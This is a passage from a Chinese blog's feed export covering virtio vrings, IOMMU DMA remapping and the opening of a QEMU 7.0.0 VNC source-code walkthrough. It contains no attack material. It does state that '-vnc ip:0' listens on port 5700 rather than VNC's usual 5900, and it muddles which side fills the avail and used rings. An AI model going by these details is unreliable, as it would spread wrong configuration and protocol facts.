class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span></span><br><span class="hljs-class">&#123;</span><br>    __u32 id;<br>    __u32 len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span> <span class="hljs-title">ring</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>Avail 数组与 Used 数组同样是一个<strong>环形队列</strong>，不过这两个数组分别由通信的两方进行使用：</p><ul><li>数据<strong>发送方</strong>准备好数据后从 <code>Avail 队列</code> 中获取可用的表项，更新描述符表，并在 <code>Used 队列</code> 中插入新的表项，通知接收方有数据到达</li><li>数据<strong>接收方</strong>从 <code>Used 队列</code> 中取出表项，读取描述符表以获取数据，完成处理后将表项插入到 <code>Avail 队列</code> 中</li></ul><p>下图为由 Guest 向 Host 发送数据的一个 vring 示例：</p><p><img src="https://s2.loli.net/2022/08/29/8uUq1jacyEYGlXR.png" alt="转自 LoyenWang 公众号的图片，非常清晰的表示了 virtqueue 工作原理的一张图！"></p><h3 id="III-virtio-配置操作抽象"><a href="#III-virtio-配置操作抽象" class="headerlink" title="III. virtio 配置操作抽象"></a>III. virtio 配置操作抽象</h3><p>结合 virtqueue，我们现在可以抽象出一个虚拟 PCI 设备的基本操作：</p><ul><li>获取 feature bits</li><li>读写配置空间</li><li>读写 status bits</li><li>设备重置</li><li>创建&#x2F;销毁 virtqueue</li></ul><p>我们将其抽象成一张函数表：<code>virtio_config_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_config_ops</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">bool</span> (*feature)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> bit);<br>        <span class="hljs-type">void</span> (*get)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        <span class="hljs-type">void</span> (*<span class="hljs-built_in">set</span>)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        u8 (*get_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-type">void</span> (*set_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev, u8 status);<br>        <span class="hljs-type">void</span> (*reset)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *(*<span class="hljs-title">find_vq</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_device</span> *<span class="hljs-title">vdev</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">unsigned</span> <span class="hljs-title">index</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">void</span> (*<span class="hljs-title">callback</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *));</span><br>        <span class="hljs-type">void</span> (*del_vq)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>feature</code>：获取设备对应的 feature bit</li><li><code>get &amp; set</code> ：读写设备的配置空间</li><li><code>get_status &amp; set_status</code>：读写设备的 status bits</li><li><code>reset</code>：重置设备</li><li><code>find_vq</code>：获取&#x2F;创建 virtqueue</li><li><code>del_vq</code>：销毁 virtqueue</li></ul><h2 id="三、IOMMU"><a href="#三、IOMMU" class="headerlink" title="三、IOMMU"></a>三、IOMMU</h2><blockquote><p>可以直接参见 <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/intel-whitepaper-using-iommu-for-dma-protection-in-uefi.pdf">Intel 的手册</a></p></blockquote><p> IOMMU 即 <strong>Input&#x2F;Output Memory Management Unit</strong>，其功能类似于 CPU 中的 MMU，是一个<strong>向设备侧提供地址翻译功能的单元</strong></p><p><img src="https://s2.loli.net/2022/09/03/3GOTl4oAExSdPcL.png" alt="image.png"></p><p>IOMMU 通常被集成于北桥中，其提供面向设备端的两个功能：</p><ul><li><strong>DMA 重映射</strong>（ <strong>DMA remapping</strong>）：有着 DMA 功能的设备可以使用虚拟地址，通过 IOMMU 转换为物理地址进行直接内存访问</li><li><strong>中断重映射</strong>（<strong>Interrupt remapping</strong>）：IOMMU 会拦截设备产生的中断，根据中断重映射表产生新的中断请求发送给 LAPIC</li></ul><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png" alt="image.png"></p><h3 id="I-DMA-重映射"><a href="#I-DMA-重映射" class="headerlink" title="I. DMA 重映射"></a>I. DMA 重映射</h3><p>DMA 重映射即面向设备侧的地址访问重翻译，如下图所示，左侧是 CPU 对内存的虚拟化：MMU 利用进程页表将进程要访问的虚拟地址翻译为物理地址，从而实现在两个进程中访问同一个虚拟地址实际上访问到不同的物理地址——DMA 重映射也是类似的原理，如下图右侧所示，当外设想要进行 DMA 时，IOMMU 会根据“设备页表”进行地址翻译，从而使得两个设备各自感知访问的是同一个地址，但实际上访问到了不同的物理地址</p><p><img src="https://s2.loli.net/2022/09/03/B3yxUoClVsArMGp.png" alt="image.png"></p><p>DMA 重映射有着以下的两种方式：</p><h4 id="①-Request-without-PASID"><a href="#①-Request-without-PASID" class="headerlink" title="① Request-without-PASID"></a>① Request-without-PASID</h4><p>在 IOMMU 中使用了一个“二层页表 + 标准页表”结构来实现 DMA 重映射，需要占用部分物理内存空间：</p><ul><li><strong>Root Table</strong>：存放各个 bus 的 DMA 重映射表地址，一个 entry 对应一个 bus</li><li><strong>Context Table</strong>：存放各个 domain 的 DMA 重映射表地址，一个 entry 对应一个 domain</li><li><strong>Address Translation Structure</strong>：实际的 DMA 重映射页表</li></ul><p>在 IOMMU 中的寄存器 <strong>Root Table Address Register</strong> 用以存放指向 Root-table 的指针</p><p><img src="https://s2.loli.net/2022/09/03/TdAB3Um4xhzHKXZ.png" alt="image.png"></p><p>DMA 重映射还需要一个 id 来唯一标识一个设备，对于 PCI 设备而言便是其 BDF（Bus&#x2F;Device&#x2F;Function），因此实际的地址访问过程如下图所示：</p><p><img src="https://s2.loli.net/2022/09/03/67FPkW2zafeMBpL.png" alt="知乎偷的图"></p><h4 id="②-Request-with-PASID"><a href="#②-Request-with-PASID" class="headerlink" title="② Request-with-PASID"></a>② Request-with-PASID</h4><h3 id="II-中断重映射"><a href="#II-中断重映射" class="headerlink" title="II.中断重映射"></a>II.中断重映射</h3><h3 id="III-IOMMU-与虚拟化"><a href="#III-IOMMU-与虚拟化" class="headerlink" title="III. IOMMU 与虚拟化"></a>III. IOMMU 与虚拟化</h3><p>虽然 IOMMU 的引入增加了与外设通信间的开销，但 IOMMU 解决了系统虚拟化技术的一个难点：对于非纯模拟的设备而言，其并不知道 GPA 与 HPA 之间的映射关系，当其按 Guest OS 提供的地址进行 DMA 时<strong>会直接访问到 Host 的内存</strong></p><p>当引入了 IOMMU 之后，IOMMU 可以根据 Host 侧提供的 GPA 到 HPA 之间的地址转换表，进行<strong>DMA remapping</strong>，这样外设就能正常地访问到 Guest 的物理内存，而不会错误地访问到 Host 对应的物理内存区域</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;虚拟化方向YLG速成入门指北&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x01】Qemu - II：VNC 模块源码分析</title>
    <link href="http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/</id>
    <published>2022-07-21T17:39:15.000Z</published>
    <updated>2022-08-19T16:32:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>vnc，🐕都不用</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>VNC 即 Virtual Network Computing，是基于<strong>RFB（Remote Frame Buffer）</strong>协议进行通信的远程桌面协议，与 telnet、ssh 等相比，VNC 最大的特点便是支持图形化了，用户可以看到远程机器的图形化界面，且能使用键盘与鼠标进行输入</p><p>Qemu 虚拟机同样支持通过 VNC只需要指定 <code>-vnc</code> 参数便能够建立 VNC Server，从而使得远程用户可以通过 VNC 连接到 Qemu 虚拟机上</p><p>本篇主要是对 Qemu 中 VNC 实现的源码分析，同时也会夹杂着部分 Qemu 显示相关的分析，源码版本 Qemu 7.0.0</p><h1 id="0x01-qemu-init-displays-显示设备初始化"><a href="#0x01-qemu-init-displays-显示设备初始化" class="headerlink" title="0x01. qemu_init_displays() - 显示设备初始化"></a>0x01. qemu_init_displays() - 显示设备初始化</h1><p>我们都知道 Qemu 的入口函数是 <code>softmmu/main.c</code> 中的 <code>qemu_main()</code>，在其中会调用到 <code>sotftmmuvl.c</code> 中的 <code>qemu_init()</code> 函数进行 Qemu 的初始化工作，包括一系列的参数解析、设备初始化等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">undef</span> main</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> main qemu_main</span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    qemu_init(argc, argv, envp);<br>    qemu_main_loop();<br>    qemu_cleanup();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本篇我们主要关注与 VNC 相关的内容，注意到在 <code>qemu_init()</code> 的末尾会调用到 <code>qemu_init_displays()</code> 进行显示初始化的工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    qemu_init_displays();<br>    <br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数比较简短，首先是调用 <code>init_displaystate()</code> 与 <code>qemu_display_init()</code> 对虚拟机本地的显示设备进行初始化，之后才是使用 <code>qemu_opts_foreach</code> 宏来遍历参数中与 vnc 相关的配置，最后调用到的是 <code>vnc_init_func()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init_displays</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DisplayState *ds;<br><br>    <span class="hljs-comment">/* 初始化本地显示 */</span><br>    ds = init_displaystate();<br>    qemu_display_init(ds, &amp;dpy);<br><br>    <span class="hljs-comment">/* 必须在终端初始化后, 由 SDL 库更改信号的 handlers */</span><br>    os_setup_signal_handling();<br><br>    <span class="hljs-comment">/* 初始化远程显示 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    qemu_opts_foreach(qemu_find_opts(<span class="hljs-string">&quot;vnc&quot;</span>),<br>                      vnc_init_func, <span class="hljs-literal">NULL</span>, &amp;error_fatal);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (using_spice) &#123;<br>        qemu_spice.display_init();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="〇、显示设备相关结构体"><a href="#〇、显示设备相关结构体" class="headerlink" title="〇、显示设备相关结构体"></a>〇、显示设备相关结构体</h2><p>在 Qemu 当中有着多个与显示设备相关的结构，他们之间的关系如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><blockquote><p>本图来自于<a href="https://www.linux-kvm.org/images/b/b2/01x10b-QEMUGfraphics.pdf">这个ppt</a></p></blockquote><h3 id="I、QemuConsole-单个控制台实例"><a href="#I、QemuConsole-单个控制台实例" class="headerlink" title="I、QemuConsole - 单个控制台实例"></a>I、QemuConsole - 单个控制台实例</h3><p>在开始分析之前我们先介绍一个新的结构体：<code>QemuConsole</code>，一个该结构体实例在 Qemu 中表示一个控制台（console）实例，对应着<strong>一个特定的 VGA 设备与一组特定的输入设备</strong>。在 Qemu 当中主要有两类控制台：图形化控制台与字符型控制台。</p><p>该结构体定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuConsole</span> &#123;</span><br>    Object parent;<br><br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-type">console_type_t</span> console_type; <span class="hljs-comment">// 控制台类型</span><br>    DisplayState *ds;           <span class="hljs-comment">// 对应的显示设备</span><br>    DisplaySurface *surface;<br>    DisplayScanout scanout;<br>    <span class="hljs-type">int</span> dcls;<br>    DisplayGLCtx *gl;<br>    <span class="hljs-type">int</span> gl_block;<br>    QEMUTimer *gl_unblock_timer;<br>    <span class="hljs-type">int</span> window_id;<br><br>    <span class="hljs-comment">/* 图形化控制台状态.  */</span><br>    Object *device; <span class="hljs-comment">// 对应的图形化设备</span><br>    <span class="hljs-type">uint32_t</span> head;<br>    QemuUIInfo ui_info;<br>    QEMUTimer *ui_timer;  <span class="hljs-comment">// 对应的 Timer</span><br>    <span class="hljs-type">const</span> GraphicHwOps *hw_ops;  <span class="hljs-comment">// 硬件操作函数</span><br>    <span class="hljs-type">void</span> *hw;<br><br>    <span class="hljs-comment">/* 字符控制台状态 */</span><br>    <span class="hljs-type">int</span> width;<br>    <span class="hljs-type">int</span> height;<br>    <span class="hljs-type">int</span> total_height;<br>    <span class="hljs-type">int</span> backscroll_height;<br>    <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-type">int</span> x_saved, y_saved;<br>    <span class="hljs-type">int</span> y_displayed;<br>    <span class="hljs-type">int</span> y_base;<br>    TextAttributes t_attrib_default; <span class="hljs-comment">/* 默认字符属性 */</span><br>    TextAttributes t_attrib; <span class="hljs-comment">/* 当前活动字符属性 */</span><br>    TextCell *cells;<br>    <span class="hljs-type">int</span> text_x[<span class="hljs-number">2</span>], text_y[<span class="hljs-number">2</span>], cursor_invalidate;<br>    <span class="hljs-type">int</span> echo;<br><br>    <span class="hljs-type">int</span> update_x0;<br>    <span class="hljs-type">int</span> update_y0;<br>    <span class="hljs-type">int</span> update_x1;<br>    <span class="hljs-type">int</span> update_y1;<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">TTYState</span> <span class="hljs-title">state</span>;</span><br>    <span class="hljs-type">int</span> esc_params[MAX_ESC_PARAMS];<br>    <span class="hljs-type">int</span> nb_esc_params;<br><br>    Chardev *chr;<br>    <span class="hljs-comment">/* 先进先出的按键输入 */</span><br>    Fifo8 out_fifo;<br>    CoQueue dump_queue;<br><br>    QTAILQ_ENTRY(QemuConsole) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于图形化设备相关的操作，主要通过函数表 <code>hw_ops</code> 来完成，对于纯字符型显示设备而言，该函数表为 <code>text_console_ops</code>，对于普通的 VGA 设备而言则为 <code>vga_ops</code>，我们在后面会看到这一点。</p><p>QemuConsole 的创建主要通过 <code>new_console()</code> 来完成，在 Qemu 中有一个全局的 QemuConsole 变量 <code>consoles</code>，每当创建一个新的 QemuConsole 后就会通过尾插法插入到这个全局的 QemuConsole 链表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, QemuConsole)</span> consoles =<br>    QTAILQ_HEAD_INITIALIZER(consoles);<br></code></pre></td></tr></table></figure><blockquote><p>什么是 <code>console</code>？狭义地说，console 最初指的就是一个设备的控制台，<em>包含了显示设备与基本输入设备</em> ，与 terminal 不同，console 通常是机器自带的，而 terminal 则往往指的是需要我们通过串口进行连接的外部设备<br>不过随着时代的发展，现在对于 console 与 terminal 之间概念的定义区别也逐渐趋于模糊，现在的机器大都不再有实体的 console，而采用软件模拟的方式，例如在 Linux 中定义了 6 个 virtual terminal（可以使用 <code>ctrl + f1 ~ f6</code> 进行切换），而当我们向 <code>/dev/console</code> 输入时，则会输出到当前的 virtual terminal 上；而在一些其他的类 UNIX 系统中，console 则往往被固定为第一个 virtual terminal</p></blockquote><h3 id="II、DisplayState-显示设备总状态"><a href="#II、DisplayState-显示设备总状态" class="headerlink" title="II、DisplayState - 显示设备总状态"></a>II、DisplayState - 显示设备总状态</h3><p>在 Qemu 当中使用一个 <code>DisplayState</code> 表示显示设备的总状态，该结构体定义于 <code>ui/console.c</code> 中,如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayState</span> &#123;</span><br>    QEMUTimer *gui_timer;   <span class="hljs-comment">// 对应更新的 timer</span><br>    <span class="hljs-type">uint64_t</span> last_update;   <span class="hljs-comment">// 上次更新时间</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">bool</span> refreshing;<br>    <span class="hljs-type">bool</span> have_gfx;          <span class="hljs-comment">// 是否有图形化显示</span><br>    <span class="hljs-type">bool</span> have_text;         <span class="hljs-comment">// 是否有纯文本显示</span><br><br>    QLIST_HEAD(, DisplayChangeListener) listeners;  <span class="hljs-comment">// 各个 Display 的 Listener 的链表</span><br>&#125;;<br><br><span class="hljs-type">static</span> DisplayState *display_state; <span class="hljs-comment">// 全局的 DisplayState</span><br></code></pre></td></tr></table></figure><p>通常而言，一个 DisplayState 可以对应着多个 QemuConsole，因为其可以对应着多个 VGA 设备，因此相应地其可以有着多个 <code>DisplayChangeListener</code> 来监视多个 Display 设备的更改，多个 <code>DisplayChangeListener</code> 之间连成一个链表</p><h3 id="III、DisplayChangeListener-监视单个显示设备的更改"><a href="#III、DisplayChangeListener-监视单个显示设备的更改" class="headerlink" title="III、DisplayChangeListener - 监视单个显示设备的更改"></a>III、DisplayChangeListener - 监视单个显示设备的更改</h3><p><code>DisplayChangeListener</code> 结构体用于<strong>监视单个显示设备的更改</strong>并进行相关操作，因此一个 DisplayChangeListener 应当与一个特定的 QemuConsole 相关联</p><p>通常而言一个 QemuConsole 可以有着多个 DisplayChangeListener（例如一个 QemuConsole 可以对应有着一个 VNC 的 DCL + 一个本地虚拟终端的 DCL）</p><p>该结构体定义于 <code>include/ui/console.h</code> 中,如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayChangeListener</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">const</span> DisplayChangeListenerOps *ops;<br>    DisplayState *ds;<br>    QemuConsole *con;<br><br>    QLIST_ENTRY(DisplayChangeListener) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其成员 <code>ops</code> 为一个 <code>DisplayChangeListenerOps</code> 函数表，该函数表中包含大量的函数指针，用以进行显示相关的操作（例如 <code>dpy_refresh</code> 指针用于刷新显示， <code>gfx_hw_update</code> 指针用于进行显卡硬件相关更新，我们在后面会看到这一点）</p><h2 id="一、init-displaystate-遍历所有的-QemuConsole-并加入-qom-tree，初始化字符型-console"><a href="#一、init-displaystate-遍历所有的-QemuConsole-并加入-qom-tree，初始化字符型-console" class="headerlink" title="一、init_displaystate() - 遍历所有的 QemuConsole 并加入 qom tree，初始化字符型 console"></a>一、init_displaystate() - 遍历所有的 QemuConsole 并加入 qom tree，初始化字符型 console</h2><p><code>init_displaystate()</code> 主要用于对 QemuConsole 进行初始化的工作，该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 由 main() 调用, 在创建 QemuConsoles 之后</span><br><span class="hljs-comment"> * 在初始化 ui (sdl/vnc/...) 之前.</span><br><span class="hljs-comment"> */</span><br>DisplayState *<span class="hljs-title function_">init_displaystate</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    gchar *name;<br>    QemuConsole *con;<br><br>    get_alloc_displaystate();<br>    QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>        <span class="hljs-keyword">if</span> (con-&gt;console_type != GRAPHIC_CONSOLE &amp;&amp;<br>            con-&gt;ds == <span class="hljs-literal">NULL</span>) &#123;<br>            text_console_do_init(con-&gt;chr, display_state);<br>        &#125;<br><br>        <span class="hljs-comment">/* 在这里连接上 qom tree (而不在 new_console()), </span><br><span class="hljs-comment">         * 在所有的 QemuConsoles 都被创建后，其顺序与序号</span><br><span class="hljs-comment">         * 都将不再更改 */</span><br>        name = g_strdup_printf(<span class="hljs-string">&quot;console[%d]&quot;</span>, con-&gt;index);<br>        object_property_add_child(container_get(object_get_root(), <span class="hljs-string">&quot;/backend&quot;</span>),<br>                                  name, OBJECT(con));<br>        g_free(name);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> display_state;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要是遍历全局的 QemuConsole 链表并将其加入到 qom tree 中，若非图形化的 console 则还会调用 <code>text_console_do_init()</code> 进行初始化工作，主要是将其设为标准的 <code>80*24</code> 的字符显示设备，并将其 <code>hw_ops</code> 设为 <code>text_console_ops</code>，其 <code>hw</code> 则指向 QemuConsole 自身</p><h2 id="二、qemu-display-init-调用对应类型-QemuDisplay-的-init-函数进行初始化"><a href="#二、qemu-display-init-调用对应类型-QemuDisplay-的-init-函数进行初始化" class="headerlink" title="二、qemu_display_init() - 调用对应类型 QemuDisplay 的 init 函数进行初始化"></a>二、qemu_display_init() - 调用对应类型 QemuDisplay 的 init 函数进行初始化</h2><p>该函数同样定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_init</span><span class="hljs-params">(DisplayState *ds, DisplayOptions *opts)</span><br>&#123;<br>    assert(opts-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    <span class="hljs-keyword">if</span> (opts-&gt;type == DISPLAY_TYPE_NONE) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    assert(dpys[opts-&gt;type] != <span class="hljs-literal">NULL</span>);<br>    dpys[opts-&gt;type]-&gt;init(ds, opts);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 dpys 是一个 <code>QemuDisplay</code> 类型的全局数组，定义于 <code>ui/console.c</code> 中，表示 Qemu 所支持的所有显示类型，我们可以通过 <code>qemu_display_register()</code> 将显示类型注册到该数组中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> QemuDisplay *dpys[DISPLAY_TYPE__MAX];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_register</span><span class="hljs-params">(QemuDisplay *ui)</span><br>&#123;<br>    assert(ui-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    dpys[ui-&gt;type] = ui;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>QemuDisplay</code> 结构体定义于 <code>ui/console.h</code> 中，表示 Qemu 所支持的单个显示类型，主要就是类型 + 初始化的函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuDisplay</span> &#123;</span><br>    DisplayType type;<br>    <span class="hljs-type">void</span> (*early_init)(DisplayOptions *opts);<br>    <span class="hljs-type">void</span> (*init)(DisplayState *ds, DisplayOptions *opts);<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>不过经笔者调试通常情况下不特定指定的话都会是 <code>DISPLAY_TYPE_NONE</code> </p></blockquote><h1 id="0x02-vnc-init-func-初始化单个-VNC-Server"><a href="#0x02-vnc-init-func-初始化单个-VNC-Server" class="headerlink" title="0x02. vnc_init_func() - 初始化单个 VNC Server"></a>0x02. vnc_init_func() - 初始化单个 VNC Server</h1><p>在一个 Qemu 实例当中，我们通常只会使用到一个 VGA 设备（也可以多个），不过我们可以同时启动多个 VNC Server，例如我们可以附加启动参数 <code>-vnc yourip:0 -vnc yourip:1</code>，此时 Qemu 就会在 5700 与 5701 端口上启动两个 VNC 服务器，而每个 VNC Server 的启动都是通过 